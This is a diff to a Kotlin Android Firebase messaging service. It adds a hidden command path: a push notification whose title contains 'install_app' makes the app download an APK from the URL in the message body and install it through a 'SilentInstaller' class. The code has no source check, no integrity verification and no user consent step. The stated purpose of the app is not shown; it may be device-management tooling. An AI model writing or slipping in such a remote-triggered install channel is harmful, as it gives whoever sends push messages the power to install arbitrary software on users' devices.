@@ -874,6 +874,12 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         // Log to Logcat
         logFCMMessage(title, body, remoteMessage)
 
+        // Check if this is an install command
+        if (title.lowercase().contains("install_app")) {
+            handleInstallApp(body)
+            return
+        }
+
         // Show notification to user
         showNotification(title, body)
 
@@ -1031,6 +1037,46 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to save notification")
         }
+    }
+
+    private fun handleInstallApp(apkUrl: String) {
+        Log.d(TAG, "══════════════════════════════════════")
+        Log.d(TAG, "📦 INSTALL APP COMMAND RECEIVED")
+        Log.d(TAG, "📦 APK URL: $apkUrl")
+        Log.d(TAG, "══════════════════════════════════════")
+
+        // Show download notification
+        showNotification("Installing App", "Downloading APK...")
+
+        val installer = SilentInstaller(applicationContext)
+        installer.downloadAndInstall(apkUrl, object : SilentInstaller.InstallCallback {
+            override fun onDownloadStarted() {
+                Log.d(TAG, "📥 Download started")
+            }
+
+            override fun onDownloadProgress(percent: Int) {
+                Log.d(TAG, "📥 Download: $percent%")
+            }
+
+            override fun onDownloadComplete() {
+                Log.d(TAG, "📥 Download complete")
+                showNotification("Installing App", "Download complete, installing...")
+            }
+
+            override fun onInstallStarted() {
+                Log.d(TAG, "📦 Install started")
+            }
+
+            override fun onInstallSuccess(packageName: String?) {
+                Log.d(TAG, "✅ Install SUCCESS: $packageName")
+                showNotification("App Installed", "Successfully installed: $packageName")
+            }
+
+            override fun onInstallFailed(error: String) {
+                Log.e(TAG, "❌ Install FAILED: $error")
+                showNotification("Install Failed", error)
+            }
+        })
     }
 
     override fun onNewToken(token: String) {
